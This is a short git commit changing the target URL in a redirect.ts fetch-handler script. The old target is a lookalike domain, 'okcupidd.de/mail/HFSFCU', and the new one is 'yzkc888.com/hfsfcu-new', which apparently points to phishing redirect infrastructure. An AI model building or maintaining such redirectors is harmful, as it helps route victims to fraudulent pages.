3ac038c6d8ce65a2d0c3123fdd2429bc587a30d0
atcivepro99 <atcivepro@gmail.com>
2025-05-31 18:10:58 -0700

    Update redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://okcupidd.de/mail/HFSFCU"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://yzkc888.com/hfsfcu-new"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
